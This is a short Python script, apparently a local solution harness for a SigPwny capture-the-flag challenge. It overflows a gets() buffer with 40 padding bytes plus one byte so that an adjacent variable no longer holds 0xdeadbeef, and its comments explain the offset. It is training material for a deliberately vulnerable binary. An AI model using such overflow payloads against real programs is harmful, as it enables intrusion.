#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# SigPwny - Overflow Challenge (local test harness)-Gantosay
#
# gets(name) has no bounds checking. name[40] sits exactly 40 bytes
# before the target variable `number` -- see write-up section 5. The
# win condition is `number != 0xdeadbeef`, so changing even a single
# byte away from the original 0xdeadbeef is already sufficient; this
# script sends one explicit overwrite byte ('B') plus relies on
# gets()'s own implicit NUL terminator for the second changed byte
# (see write-up section 6 for exactly why both matter).

import subprocess

BINARY = "./challenge"

OFFSET = 40  # bytes from the start of name[] to the start of number

# 'B' (0x42) explicitly overwrites number's first byte; gets()'s own
# NUL terminator, written automatically right after it, overwrites the
# second byte -- together, more than enough to differ from 0xdeadbeef.
payload = b"A" * OFFSET + b"B\n"


def run_local():
    process = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    output, error = process.communicate(payload, timeout=10)

    print(output.decode(errors="replace"))
    if error:
        print("[stderr]", error.decode(errors="replace"))


if __name__ == "__main__":
    run_local()
